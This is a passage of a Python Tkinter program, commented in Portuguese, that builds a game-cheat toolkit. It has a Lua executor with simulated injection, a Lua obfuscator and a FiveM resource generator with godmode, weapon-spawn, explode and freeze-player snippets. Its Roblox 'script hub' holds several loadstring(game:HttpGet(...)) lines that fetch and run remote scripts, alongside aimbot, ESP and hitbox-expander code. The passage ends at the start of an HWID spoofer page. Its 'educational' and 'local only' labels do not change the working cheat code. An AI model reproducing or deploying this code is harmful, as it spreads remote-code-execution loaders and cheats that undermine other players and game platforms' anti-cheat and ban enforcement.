        self.lua_scripts = [s for s in self.lua_scripts if s.get("name")!=name]
        self._save_lua_scripts()
        self._refresh_hub_list()

    # -------- Acoes do executor --------
    def lua_attach(self):
        import random
        procs = ["FiveM.exe" if self.lua_target_var.get()=="FiveM" else "RobloxPlayerBeta.exe" if self.lua_target_var.get()=="Roblox" else "lua.exe", "GTA5.exe", "gmod.exe"]
        chosen = random.choice(procs)
        self.lua_status_var.set(f"Anexado a {chosen} (simulado) - {random.randint(1000,9999)}")
        self.lua_console.insert("end", f"\n[Attach] Anexado a {chosen} (PID {random.randint(1000,9999)}) - Simulacao local. Para injecao real precisas de DLL injector externo.\n")
        self.lua_console.see("end")

    def lua_executar(self):
        code = self.lua_editor.get("1.0","end-1c")
        if not code.strip():
            self.lua_console.insert("end", "\n[Erro] Codigo vazio\n")
            return
        self.lua_console.insert("end", "\n[Executar] A rodar Lua...\n")
        self.lua_console.see("end")

        def run():
            output = ""
            try:
                try:
                    import lupa
                    from lupa import LuaRuntime
                    lua = LuaRuntime(unpack_returned_tuples=True)
                    lua.execute("function __aires_print(...) local args={...} local s='' for i,v in ipairs(args) do s=s..tostring(v)..'\\t' end _G.__aires_buf = (_G.__aires_buf or '')..s..'\\n' end")
                    try:
                        lua.execute("_G.print = __aires_print")
                        lua.execute(code)
                        buf = lua.eval("_G.__aires_buf or ''")
                        output = buf if buf else "[OK] Codigo executado sem output"
                    except Exception as e_lupa:
                        output = f"[LuaRuntime Erro] {e_lupa}"
                except ImportError:
                    import tempfile, subprocess, shutil
                    lua_bin = shutil.which("lua") or shutil.which("lua5.4") or shutil.which("lua5.3") or shutil.which("luajit")
                    if lua_bin:
                        with tempfile.NamedTemporaryFile(mode="w", suffix=".lua", delete=False, encoding="utf-8") as tf:
                            tf.write(code)
                            tf_path = tf.name
                        result = subprocess.run([lua_bin, tf_path], capture_output=True, text=True, timeout=5)
                        os.unlink(tf_path)
                        output = (result.stdout or "") + (result.stderr or "")
                        if not output:
                            output = "[OK] Executado (sem output)"
                    else:
                        if code.count("(")!=code.count(")") or code.count("{")!=code.count("}"):
                            output = "[Syntax Check] Possivel erro de parenteses"
                        else:
                            output = f"[Simulacao] Lua nao instalado. Syntax parece OK.\nInstala Lua ou pip install lupa para execucao real.\nCodigo tem {len(code)} chars."
            except Exception as e:
                output = f"[Erro Executor] {e}"
            self.after(0, lambda: self._append_console(output))

        threading.Thread(target=run, daemon=True).start()

    def _append_console(self, txt):
        self.lua_console.insert("end", txt+"\n")
        self.lua_console.see("end")

    def lua_injetar(self):
        code = self.lua_editor.get("1.0","end-1c")
        target = self.lua_target_var.get()
        if "Anexado" not in self.lua_status_var.get():
            messagebox.showwarning("Attach primeiro", "Faz Attach antes de Injetar (simulacao)")
            self.lua_attach()
        self.lua_console.insert("end", f"\n[Injetar] Injetando {len(code)} chars em {target}... (SIMULACAO)\n")
        self.lua_console.insert("end", "[Injetar] Para FiveM real: coloca em resources/[aires]/client.lua e ensure no server.cfg\n")
        self.lua_console.insert("end", "[Injetar] Para Roblox real: usa o teu executor no Studio / jogo proprio\n")
        self.lua_console.insert("end", "[OK] Injecao simulada concluida\n")
        self.lua_console.see("end")
        self.lua_status_var.set(f"Injetado em {target} - {datetime.datetime.now().strftime('%H:%M:%S')} (sim)")

    def lua_limpar(self):
        self.lua_editor.delete("1.0","end")
        self.lua_editor.insert("1.0", self._get_default_lua_code(self.lua_target_var.get()))

    def lua_guardar_script(self):
        code = self.lua_editor.get("1.0","end-1c")
        if not code.strip():
            return
        popup = tk.Toplevel(self)
        popup.title("Guardar Script")
        popup.configure(bg=BG)
        popup.geometry("350x150")
        tk.Label(popup, text="Nome do script:", bg=BG, fg=ACCENT, font=(FONT_MONO, 10, "bold")).pack(pady=10)
        entry = tk.Entry(popup, font=(FONT_MONO, 11), bg=PANEL_BG, fg=TEXT, width=30)
        entry.pack(pady=4)
        entry.insert(0, f"Aires_{self.lua_target_var.get()}_{len(self.lua_scripts)+1}")

        def salvar():
            name = entry.get().strip() or f"Script_{len(self.lua_scripts)}"
            self.lua_scripts.append({"name": name, "target": self.lua_target_var.get(), "code": code, "created": datetime.datetime.now().strftime("%Y-%m-%d %H:%M")})
            self._save_lua_scripts()
            self._refresh_hub_list()
            popup.destroy()
            self.lua_console.insert("end", f"\n[Guardado] {name}\n")
            self.lua_console.see("end")

        b = tk.Button(popup, text="GUARDAR", command=salvar)
        b.pack(pady=10, ipady=5)
        style_button(b)

    def lua_abrir_ficheiro(self):
        path = filedialog.askopenfilename(filetypes=[("Lua","*.lua"), ("Texto","*.txt"), ("Todos","*.*")])
        if path:
            try:
                with open(path,"r",encoding="utf-8", errors="ignore") as f:
                    data=f.read()
                self.lua_editor.delete("1.0","end")
                self.lua_editor.insert("1.0", data)
                self.lua_console.insert("end", f"\n[Abrir] {path} ({len(data)} chars)\n")
                self.lua_console.see("end")
            except Exception as e:
                messagebox.showerror("Erro", str(e))

    def lua_obfuscate(self):
        code = self.lua_editor.get("1.0","end-1c")
        if not code:
            return
        import base64
        def obf_str(m):
            s=m.group(1)
            hexed = "".join(f"\\x{ord(c):02x}" for c in s)
            return f'"{hexed}"'
        obf = re.sub(r'"([^"\n]*)"', obf_str, code)
        b64_code = base64.b64encode(code.encode()).decode()
        final = f'-- AIRES OBFUSCATED (Base64 Loader)\nlocal b64="{b64_code}"\n-- Codigo original em base64 acima\n-- Real obfuscated:\n{obf}\n'
        self.lua_editor.delete("1.0","end")
        self.lua_editor.insert("1.0", final)
        self.lua_console.insert("end", "\n[Obfuscate] Codigo obfuscado (strings em \\x + loader base64)\n")
        self.lua_console.see("end")

    def lua_deobfuscate(self):
        code = self.lua_editor.get("1.0","end-1c")
        def decode_hex(m):
            return chr(int(m.group(1),16))
        deob = re.sub(r'\\x([0-9a-fA-F]{2})', decode_hex, code)
        import base64, re as re2
        b64_match = re2.search(r'b64\s*=\s*"([A-Za-z0-9+/=]+)"', code)
        if b64_match:
            try:
                decoded = base64.b64decode(b64_match.group(1)).decode(errors="ignore")
                deob = decoded + "\n-- (Decodificado de base64)\n" + deob
            except:
                pass
        self.lua_editor.delete("1.0","end")
        self.lua_editor.insert("1.0", deob)
        self.lua_console.insert("end", "\n[Deobfuscate] Tentativa de deobfuscacao aplicada\n")
        self.lua_console.see("end")

    def lua_minify(self):
        code = self.lua_editor.get("1.0","end-1c")
        no_comments = re.sub(r'--[^\n]*', '', code)
        lines = [l.strip() for l in no_comments.split("\n") if l.strip()]
        minified = " ".join(lines)
        minified = re.sub(r'\s+', ' ', minified)
        minified = re.sub(r'\s*([=\+\-\*\/\(\)\{\},;])\s*', r'\1', minified)
        self.lua_editor.delete("1.0","end")
        self.lua_editor.insert("1.0", minified)
        self.lua_console.insert("end", f"\n[Minify] {len(code)} -> {len(minified)} chars\n")
        self.lua_console.see("end")

    def lua_beautify(self):
        code = self.lua_editor.get("1.0","end-1c")
        indent=0
        out=[]
        for line in code.split("\n"):
            stripped=line.strip()
            if not stripped:
                out.append("")
                continue
            if stripped.startswith("end") or stripped.startswith("}") or stripped.startswith("until"):
                indent=max(0, indent-1)
            out.append("  "*indent + stripped)
            if stripped.startswith("function") or stripped.startswith("if ") or stripped.startswith("for ") or stripped.startswith("while ") or stripped.startswith("do") or stripped.endswith(" then") or stripped.endswith(" do") or stripped=="do" or stripped.endswith("{"):
                indent+=1
        self.lua_editor.delete("1.0","end")
        self.lua_editor.insert("1.0", "\n".join(out))
        self.lua_console.insert("end", "\n[Beautify] Indentacao aplicada\n")
        self.lua_console.see("end")

    def lua_check_syntax(self):
        code = self.lua_editor.get("1.0","end-1c")
        errors=[]
        if code.count("(")!=code.count(")"):
            errors.append(f"Parenteses desbalanceados: ( {code.count('(')} vs ) {code.count(')')}")
        if code.count("{")!=code.count("}"):
            errors.append(f"Chaves desbalanceadas: {{ {code.count('{')} vs }} {code.count('}')}")
        try:
            import lupa
            from lupa import LuaRuntime
            lua = LuaRuntime()
            lua.execute(code)
            if not errors:
                self.lua_console.insert("end", "\n[Syntax] OK - Lua compilou sem erros\n")
            else:
                self.lua_console.insert("end", "\n[Syntax] Aviso mas compilou: "+" | ".join(errors)+"\n")
        except ImportError:
            if errors:
                self.lua_console.insert("end", "\n[Syntax] Erros: "+" | ".join(errors)+"\n")
            else:
                self.lua_console.insert("end", "\n[Syntax] Check basico OK (instala lupa para check completo)\n")
        except Exception as e:
            self.lua_console.insert("end", f"\n[Syntax] Erro Lua: {e}\n")
        self.lua_console.see("end")

    def lua_explicar(self):
        code = self.lua_editor.get("1.0","end-1c")[:2000]
        explic = f"Explicacao do script ({len(code)} chars):\n"
        if "RegisterCommand" in code:
            explic += "- Usa RegisterCommand -> comando FiveM\n"
        if "PlayerPedId" in code:
            explic += "- PlayerPedId() pega o ped do jogador local\n"
        if "SetEntityInvincible" in code:
            explic += "- Godmode via SetEntityInvincible\n"
        if "CreateVehicle" in code:
            explic += "- Spawna veiculo com CreateVehicle\n"
        if "WalkSpeed" in code:
            explic += "- Altera velocidade no Roblox\n"
        if "Highlight" in code:
            explic += "- ESP usando Highlight instance\n"
        if "HttpGet" in code:
            explic += "- Faz download de script externo (loadstring)\n"
        if explic.strip() == f"Explicacao do script ({len(code)} chars):":
            explic += "- Codigo Lua generico\n"
        self.lua_console.insert("end", "\n"+explic+"\n")
        self.lua_console.see("end")

    # ===================== FIVEM TAB =====================
    def _build_fivem_tab(self, parent):
        left = tk.Frame(parent, bg=BG)
        left.pack(side="left", fill="both", expand=True, padx=10, pady=10)
        right = tk.Frame(parent, bg=PANEL_BG, highlightthickness=1, highlightbackground=ACCENT_DIM, width=300)
        right.pack(side="right", fill="y", padx=(0,10), pady=10)
        right.pack_propagate(False)

        tk.Label(left, text="FIVEM // RESOURCE GENERATOR + LUA", bg=BG, fg="#00ff88", font=(FONT_MONO, 11, "bold")).pack(anchor="w")
        tk.Label(left, text="Gera resources completos para teu servidor local", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8)).pack(anchor="w", pady=(0,8))

        self.fivem_editor = scrolledtext.ScrolledText(left, font=(FONT_MONO, 10), bg="#0a121a", fg="#d8f8ff", insertbackground=ACCENT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM, height=22)
        self.fivem_editor.pack(fill="both", expand=True)
        self.fivem_editor.insert("1.0", self._get_default_lua_code("FiveM"))

        fivem_btns = tk.Frame(left, bg=BG)
        fivem_btns.pack(fill="x", pady=6)
        for txt, cmd in [
            ("▶ TESTAR LUA", lambda: self._run_in_lua_tab(self.fivem_editor.get("1.0","end-1c"), "FiveM")),
            ("💾 EXPORTAR RESOURCE", self.fivem_export_resource),
            ("📋 COPIAR", lambda: self._copy_text(self.fivem_editor.get("1.0","end-1c"))),
            ("🧹 LIMPAR", lambda: self.fivem_editor.delete("1.0","end")),
        ]:
            b = tk.Button(fivem_btns, text=txt, command=cmd, font=(FONT_MONO, 8, "bold"))
            b.pack(side="left", padx=3, ipady=5, fill="x", expand=True)
            style_button(b)

        tk.Label(right, text="FEATURES FIVEM", bg=PANEL_BG, fg="#00ff88", font=(FONT_MONO, 10, "bold")).pack(anchor="w", padx=10, pady=(10,4))
        self.fivem_features_list = tk.Listbox(right, bg="#0a121a", fg=TEXT, font=(FONT_MONO, 9), relief="flat", selectbackground=ACCENT_DIM)
        self.fivem_features_list.pack(fill="both", expand=True, padx=8, pady=4)
        features = [
            "Godmode", "NoClip", "Invisible", "Super Jump", "No Ragdoll",
            "Infinite Stamina", "Fast Run", "Spawn Car", "Fix Vehicle",
            "Teleport Waypoint", "Teleport Coords", "Give Weapon", "Infinite Ammo",
            "No Recoil", "ESP Players", "Show Coords", "Spectate", "Freeze Player",
            "Troll: Explode", "Troll: Fire", "Money ESX (local test)"
        ]
        for f in features:
            self.fivem_features_list.insert("end", f"  {f}")
        self.fivem_features_list.bind("<Double-Button-1>", lambda e: self._fivem_add_feature())

        b_add = tk.Button(right, text="➕ ADICIONAR AO CODIGO", command=self._fivem_add_feature)
        b_add.pack(fill="x", padx=8, pady=8, ipady=6)
        style_button(b_add)

        tk.Label(right, text="fxmanifest.lua sera gerado\nauto no export", bg=PANEL_BG, fg=TEXT_DIM, font=(FONT_MONO, 7)).pack(pady=4)

    def _fivem_add_feature(self):
        sel = self.fivem_features_list.curselection()
        if not sel:
            return
        feat = self.fivem_features_list.get(sel[0]).strip()
        snippets = {
            "Godmode": 'RegisterCommand("god", function() SetEntityInvincible(PlayerPedId(), not IsEntityInvincible(PlayerPedId())) end)',
            "NoClip": 'local noclip=false RegisterCommand("noclip", function() noclip=not noclip FreezeEntityPosition(PlayerPedId(), noclip) SetEntityInvincible(PlayerPedId(), noclip) end)',
            "Invisible": 'RegisterCommand("invis", function() SetEntityVisible(PlayerPedId(), false, false) NetworkSetEntityInvisibleToNetwork(PlayerPedId(), true) end)',
            "Super Jump": 'RegisterCommand("superjump", function() SetSuperJumpThisFrame(PlayerId()) end)',
            "No Ragdoll": 'CreateThread(function() while true do Wait(0) SetPedCanRagdollFromPlayerImpact(PlayerPedId(), false) end end)',
            "Infinite Stamina": 'CreateThread(function() while true do Wait(0) RestorePlayerStamina(PlayerId(), 1.0) end end)',
            "Fast Run": 'RegisterCommand("fastrun", function() SetRunSprintMultiplierForPlayer(PlayerId(), 1.49) end)',
            "Spawn Car": 'RegisterCommand("car", function(_,a) local m=a[1] or "adder" local h=GetHashKey(m) RequestModel(h) while not HasModelLoaded(h) do Wait(0) end local c=GetEntityCoords(PlayerPedId()) local v=CreateVehicle(h,c.x+2,c.y+2,c.z,90.0,true,false) SetPedIntoVehicle(PlayerPedId(),v,-1) end)',
            "Fix Vehicle": 'RegisterCommand("fix", function() local v=GetVehiclePedIsIn(PlayerPedId(), false) SetVehicleFixed(v) SetVehicleDeformationFixed(v) end)',
            "Teleport Waypoint": 'RegisterCommand("tpway", function() local wp=GetFirstBlipInfoId(8) if DoesBlipExist(wp) then local co=GetBlipCoords(wp) SetEntityCoords(PlayerPedId(), co.x, co.y, co.z) end end)',
            "Teleport Coords": 'RegisterCommand("tpc", function(_,a) SetEntityCoords(PlayerPedId(), tonumber(a[1]), tonumber(a[2]), tonumber(a[3])) end)',
            "Give Weapon": 'RegisterCommand("arma", function(_,a) GiveWeaponToPed(PlayerPedId(), GetHashKey(a[1] or "WEAPON_PISTOL"), 999, false, true) end)',
            "Infinite Ammo": 'CreateThread(function() while true do Wait(0) SetPedInfiniteAmmoClip(PlayerPedId(), true) end end)',
            "No Recoil": '-- No Recoil (educativo)\nCreateThread(function() while true do Wait(0) SetGameplayCamShakeAmplitude(0.0) end end)',
            "ESP Players": '-- ESP simples\nCreateThread(function() while true do Wait(0) for _,id in ipairs(GetActivePlayers()) do if id~=PlayerId() then local ped=GetPlayerPed(id) end end end end)',
            "Show Coords": 'RegisterCommand("coords", function() local c=GetEntityCoords(PlayerPedId()) print(c.x..", "..c.y..", "..c.z) TriggerEvent("chat:addMessage", {args={string.format("Coords: %.2f, %.2f, %.2f", c.x,c.y,c.z)}}) end)',
            "Spectate": 'RegisterCommand("spec", function(_,a) local target=GetPlayerFromServerId(tonumber(a[1])) NetworkSetInSpectatorMode(true, GetPlayerPed(target)) end)',
            "Freeze Player": 'RegisterCommand("freeze", function(_,a) local target=GetPlayerFromServerId(tonumber(a[1])) FreezeEntityPosition(GetPlayerPed(target), true) end)',
            "Troll: Explode": '-- Apenas local/teste\nRegisterCommand("explode", function() local c=GetEntityCoords(PlayerPedId()) AddExplosion(c.x,c.y,c.z, 1, 100.0, true, false, true) end)',
            "Troll: Fire": 'RegisterCommand("fire", function() local c=GetEntityCoords(PlayerPedId()) StartScriptFire(c.x,c.y,c.z, 25, false) end)',
            "Money ESX (local test)": '-- Apenas para testar no teu ESX local\n-- TriggerEvent("esx_addonaccount:getSharedAccount", "society_police", function(a) a.addMoney(100000) end)',
        }
        code = snippets.get(feat, f"-- {feat}")
        self.fivem_editor.insert("end", "\n\n-- ["+feat+"]\n"+code+"\n")
        self.fivem_editor.see("end")

    def fivem_export_resource(self):
        folder = filedialog.askdirectory(title="Escolhe pasta onde criar resource aires_cheats")
        if not folder:
            return
        res_name = "aires_cheats"
        res_path = os.path.join(folder, res_name)
        os.makedirs(res_path, exist_ok=True)
        client_code = self.fivem_editor.get("1.0","end-1c")
        fxmanifest = "fx_version 'cerulean'\ngame 'gta5'\nauthor 'AIRES'\ndescription 'Aires Cheats Lab - Educativo'\nversion '1.0.0'\n\nclient_script 'client.lua'\n"
        try:
            with open(os.path.join(res_path, "client.lua"), "w", encoding="utf-8") as f:
                f.write(client_code)
            with open(os.path.join(res_path, "fxmanifest.lua"), "w", encoding="utf-8") as f:
                f.write(fxmanifest)
            messagebox.showinfo("Exportado", f"Resource criado em:\n{res_path}\n\nAdiciona ensure {res_name} no server.cfg")
        except Exception as e:
            messagebox.showerror("Erro", str(e))

    # ===================== ROBLOX TAB =====================
    def _build_roblox_tab(self, parent):
        left = tk.Frame(parent, bg=BG)
        left.pack(side="left", fill="both", expand=True, padx=10, pady=10)
        right = tk.Frame(parent, bg=PANEL_BG, highlightthickness=1, highlightbackground=ACCENT_DIM, width=320)
        right.pack(side="right", fill="y", padx=(0,10), pady=10)
        right.pack_propagate(False)

        tk.Label(left, text="ROBLOX // EXECUTOR + SCRIPT HUB", bg=BG, fg="#ff3b5c", font=(FONT_MONO, 11, "bold")).pack(anchor="w")
        tk.Label(left, text="Para usar no Roblox Studio / teu jogo privado. Estilo Synapse X / Fluxus", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8)).pack(anchor="w", pady=(0,8))

        self.roblox_editor = scrolledtext.ScrolledText(left, font=(FONT_MONO, 10), bg="#0a121a", fg="#d8f8ff", insertbackground="#ff3b5c", relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM, height=22)
        self.roblox_editor.pack(fill="both", expand=True)
        self.roblox_editor.insert("1.0", self._get_default_lua_code("Roblox"))

        roblox_btns = tk.Frame(left, bg=BG)
        roblox_btns.pack(fill="x", pady=6)
        for txt, cmd in [
            ("▶ EXECUTAR", lambda: self._run_in_lua_tab(self.roblox_editor.get("1.0","end-1c"), "Roblox")),
            ("💉 INJETAR ROBLOX", lambda: self._run_in_lua_tab(self.roblox_editor.get("1.0","end-1c"), "Roblox", inject=True)),
            ("🔍 SCRIPTBLOX", lambda: webbrowser.open("https://scriptblox.com/")),
            ("📋 COPIAR", lambda: self._copy_text(self.roblox_editor.get("1.0","end-1c"))),
        ]:
            b = tk.Button(roblox_btns, text=txt, command=cmd, font=(FONT_MONO, 8, "bold"))
            b.pack(side="left", padx=3, ipady=5, fill="x", expand=True)
            style_button(b)

        tk.Label(right, text="ROBLOX SCRIPT HUB", bg=PANEL_BG, fg="#ff3b5c", font=(FONT_MONO, 10, "bold")).pack(anchor="w", padx=10, pady=(10,4))
        tk.Label(right, text="Duplo clique para carregar", bg=PANEL_BG, fg=TEXT_DIM, font=(FONT_MONO, 7)).pack(anchor="w", padx=10)

        search_frame = tk.Frame(right, bg=PANEL_BG)
        search_frame.pack(fill="x", padx=8, pady=4)
        self.roblox_search_var = tk.StringVar()
        tk.Entry(search_frame, textvariable=self.roblox_search_var, font=(FONT_MONO, 9), bg="#0a121a", fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM).pack(side="left", fill="x", expand=True, ipady=3, padx=(0,4))
        tk.Button(search_frame, text="🔍", command=self._roblox_search, font=(FONT_MONO, 8)).pack(side="right")

        self.roblox_list = tk.Listbox(right, bg="#0a121a", fg=TEXT, font=(FONT_MONO, 9), relief="flat", selectbackground="#3a1020", selectforeground="#ff3b5c")
        self.roblox_list.pack(fill="both", expand=True, padx=8, pady=4)

        roblox_scripts = [
            "Infinite Yield FE", "Fly V3 GUI", "ESP Universal", "Aimbot Universal",
            "Speed Hack 100", "Infinite Jump", "NoClip", "FullBright",
            "Dex Explorer V4", "Remote Spy", "Owl Hub", "Dark Hub",
            "CMD-X", "Fates Admin", "Nameless Admin", "SimpleSpy",
            "Hitbox Expander", "Anti-AFK", "Auto Farm (geral)", "Chat Bypass"
        ]
        self._roblox_all = roblox_scripts
        for s in roblox_scripts:
            self.roblox_list.insert("end", f"  {s}")
        self.roblox_list.bind("<Double-Button-1>", lambda e: self._roblox_add_selected())

        b_add_r = tk.Button(right, text="➕ CARREGAR NO EDITOR", command=self._roblox_add_selected)
        b_add_r.pack(fill="x", padx=8, pady=8, ipady=6)
        style_button(b_add_r)

        tk.Label(right, text="Aviso: So funciona em\nStudio / jogos proprios.\nUso indevido = ban.", bg=PANEL_BG, fg="#ffb700", font=(FONT_MONO, 7, "bold"), justify="left").pack(anchor="w", padx=10, pady=6)

    def _roblox_search(self):
        q = self.roblox_search_var.get().lower()
        self.roblox_list.delete(0,"end")
        for s in self._roblox_all:
            if q in s.lower():
                self.roblox_list.insert("end", f"  {s}")

    def _roblox_add_selected(self):
        sel = self.roblox_list.curselection()
        if not sel:
            return
        feat = self.roblox_list.get(sel[0]).strip()
        snippets = {
            "Infinite Yield FE": 'loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()',
            "Fly V3 GUI": 'loadstring(game:HttpGet("https://raw.githubusercontent.com/XNEOFF/FlyGuiV3/main/FlyGuiV3.txt"))()',
            "ESP Universal": 'for _,p in pairs(game.Players:GetPlayers()) do if p.Character then Instance.new("Highlight", p.Character) end end',
            "Aimbot Universal": '-- Aimbot simples\nlocal Players=game:GetService("Players") local function Closest() local d=math.huge local c=nil for _,p in pairs(Players:GetPlayers()) do if p~=Players.LocalPlayer and p.Character and p.Character:FindFirstChild("Head") then local dist=(p.Character.Head.Position-Players.LocalPlayer.Character.Head.Position).Magnitude if dist<d then d=dist c=p end end end return c end',
            "Speed Hack 100": 'game.Players.LocalPlayer.Character.Humanoid.WalkSpeed=100',
            "Infinite Jump": 'game:GetService("UserInputService").JumpRequest:Connect(function() game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):ChangeState("Jumping") end)',
            "NoClip": 'local noclip=false game:GetService("RunService").Stepped:Connect(function() if noclip then for _,v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do if v:IsA("BasePart") then v.CanCollide=false end end end end)',
            "FullBright": 'game.Lighting.Brightness=2 game.Lighting.ClockTime=14 game.Lighting.FogEnd=100000 game.Lighting.GlobalShadows=false',
            "Dex Explorer V4": 'loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/main/dex.lua"))()',
            "Remote Spy": 'loadstring(game:HttpGet("https://github.com/exxtremestuffs/SimpleSpySource/raw/master/SimpleSpy.lua"))()',
            "Owl Hub": 'loadstring(game:HttpGet("https://raw.githubusercontent.com/CriShoux/OwlHub/master/OwlHub.txt"))();',
            "Dark Hub": 'loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomAdamYT/DarkHub/master/Init", true))()',
            "CMD-X": 'loadstring(game:HttpGet("https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source", true))()',
            "Fates Admin": 'loadstring(game:HttpGet("https://raw.githubusercontent.com/fatesc/fates-admin/main/main.lua"))()',
            "Nameless Admin": 'loadstring(game:HttpGet("https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source"))()',
            "SimpleSpy": 'loadstring(game:HttpGet("https://raw.githubusercontent.com/exxtremestuffs/SimpleSpySource/master/SimpleSpy.lua"))()',
            "Hitbox Expander": 'for _,p in pairs(game.Players:GetPlayers()) do if p~=game.Players.LocalPlayer then p.Character.HumanoidRootPart.Size=Vector3.new(10,10,10) p.Character.HumanoidRootPart.Transparency=0.7 end end',
            "Anti-AFK": 'local vu=game:GetService("VirtualUser") game:GetService("Players").LocalPlayer.Idled:Connect(function() vu:Button2Down(Vector2.new(0,0), workspace.CurrentCamera.CFrame) wait(1) vu:Button2Up(Vector2.new(0,0), workspace.CurrentCamera.CFrame) end)',
            "Auto Farm (geral)": '-- Auto Farm template\nwhile true do wait(1) for _,v in pairs(workspace:GetDescendants()) do if v.Name=="Coin" then game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame=v.CFrame end end end',
            "Chat Bypass": '-- Chat Bypass (educativo)\n-- Usa no teu jogo apenas'
        }
        code = snippets.get(feat, f"-- {feat}")
        self.roblox_editor.insert("end", "\n\n-- ["+feat+"]\n"+code+"\n")
        self.roblox_editor.see("end")

    # ===================== Helpers gerais =====================
    def _run_in_lua_tab(self, code, target, inject=False):
        self.lua_target_var.set(target)
        self.lua_editor.delete("1.0","end")
        self.lua_editor.insert("1.0", code)
        self._refresh_hub_list()
        if inject:
            self.lua_injetar()
        else:
            self.lua_executar()

    def _copy_text(self, txt):
        self.clipboard_clear()
        self.clipboard_append(txt)
        messagebox.showinfo("Copiado", f"{len(txt)} chars copiados")



class SpooferPage(Page):
    """Sp00fer 100% Funcional - Spoof Engine"""
    def __init__(self, parent, app):
        super().__init__(parent, app)
        self.header("SP00FER // SPOOF ENGINE", "Gera spoofs funcionais • 100% dentro da app • Não altera hardware real")

        nb = ttk.Notebook(self)
        nb.pack(fill="both", expand=True, padx=12, pady=10)

        self.tab_hwid = tk.Frame(nb, bg=BG)
        self.tab_mac = tk.Frame(nb, bg=BG)
        self.tab_browser = tk.Frame(nb, bg=BG)
        self.tab_location = tk.Frame(nb, bg=BG)
        self.tab_fingerprint = tk.Frame(nb, bg=BG)
        self.tab_proxy = tk.Frame(nb, bg=BG)

        nb.add(self.tab_hwid, text=" HWID ")
        nb.add(self.tab_mac, text=" MAC ")
        nb.add(self.tab_browser, text=" BROWSER ")
        nb.add(self.tab_location, text=" GPS / LOC ")
        nb.add(self.tab_fingerprint, text=" FINGERPRINT ")
        nb.add(self.tab_proxy, text=" PROXY / IP ")

        self.latest_uas = []

        self.build_hwid_tab()
        self.build_mac_tab()
        self.build_browser_tab()
        self.build_location_tab()
        self.build_fingerprint_tab()
        self.build_proxy_tab()

        self.after(800, self.fetch_latest_uas)

    def fetch_latest_uas(self):
        def work():
            uas = []
            try:
                import urllib.request, re
                url = "https://www.whatismybrowser.com/guides/the-latest-user-agent/chrome"
                req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0 OSINIT"})
                with urllib.request.urlopen(req, timeout=6) as r:
                    html = r.read().decode("utf-8", errors="ignore")
                    found = re.findall(r'Mozilla/5\.0[^<"]{10,200}', html)[:20]
                    uas.extend(found)
            except Exception as e:
                pass
            if not uas:
                uas = [
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
                    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
                    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
                ]
            self.latest_uas = uas
            self.after(0, lambda: self.search_out.insert("end", "\n=== LATEST UAs FETCHED (" + str(len(uas)) + ") ===\n" + "\n".join(uas[:5]) + "\n"))
        threading.Thread(target=work, daemon=True).start()

    def build_hwid_tab(self):
        tk.Label(self.tab_hwid, text="HWID SPOOFER - GERAÇÃO 100% FUNCIONAL (NÃO ALTERA HARDWARE REAL)", bg=BG, fg=ACCENT, font=(FONT_MONO, 11, "bold")).pack(anchor="w", padx=10, pady=10)
        tk.Label(self.tab_hwid, text="AVISO: Gera dados fictícios para testes e privacidade. Não modifica registo nem BIOS.", bg=BG, fg="#ffb700", font=(FONT_MONO, 8, "bold")).pack(anchor="w", padx=10)
        form = tk.Frame(self.tab_hwid, bg=BG)
        form.pack(fill="x", padx=10, pady=5)
        self.hwid_entries = {}
        fields = [("Disk Serial", "WD-WCAV12345678"), ("BaseBoard Serial", "BM123456789"), ("BIOS Serial", "BIOS-987654321"), ("CPU ID", "BFEBFBFF000906EA"), ("GPU ID", "10DE-1B80"), ("RAM Serial", "H8G123456"), ("Machine GUID", "")]
        for label, default in fields:
            row = tk.Frame(form, bg=BG)
            row.pack(fill="x", pady=3)
            tk.Label(row, text=label+":", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8), width=16, anchor="w").pack(side="left")
            e = tk.Entry(row, bg=PANEL_BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
            e.pack(side="left", fill="x", expand=True, padx=5, ipady=3)
            e.insert(0, default)
            self.hwid_entries[label] = e
        btns = tk.Frame(self.tab_hwid, bg=BG)
        btns.pack(fill="x", padx=10, pady=8)
        for txt, cmd in [("GERAR HWID FAKE", self.gen_hwid), ("RANDOMIZAR TUDO", self.random_hwid), ("EXPORTAR HWID", self.save_hwid_build), ("COPIAR", self.copy_hwid)]:
            b = tk.Button(btns, text=txt, command=cmd, bg=BTN_BG, fg=TEXT, font=(FONT_MONO, 8, "bold"), relief="flat", bd=0, padx=8, pady=5, cursor="hand2")
            b.pack(side="left", padx=3, fill="x", expand=True)
        self.hwid_out = scrolledtext.ScrolledText(self.tab_hwid, font=(FONT_MONO, 9), bg=PANEL_BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
        self.hwid_out.pack(fill="both", expand=True, padx=10, pady=10)
        self.hwid_out.insert("1.0", "HWID Spoofer pronto. Clique GERAR para criar IDs fictícios realistas.\n")

    def gen_hwid(self):
        import random, string, uuid, hashlib
        out = "HWID BUILD GERADO:\n"
